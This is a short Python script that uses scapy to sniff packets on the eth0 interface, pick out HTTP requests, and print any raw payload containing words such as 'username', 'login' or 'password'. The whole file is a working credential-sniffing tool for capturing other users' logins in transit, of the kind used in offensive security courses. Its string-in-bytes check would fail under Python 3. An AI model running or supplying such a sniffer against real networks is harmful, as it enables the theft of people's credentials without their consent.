#!/usr/bin/env python

# By default the terminal have limit of 500 lines scrollback but you can chage it
# in settings

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


# Process sniffed packets
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "login", "pass", "password"]
            for keyword in keywords:
                if keyword in load:
                    print(load)
                    break

   
sniff("eth0")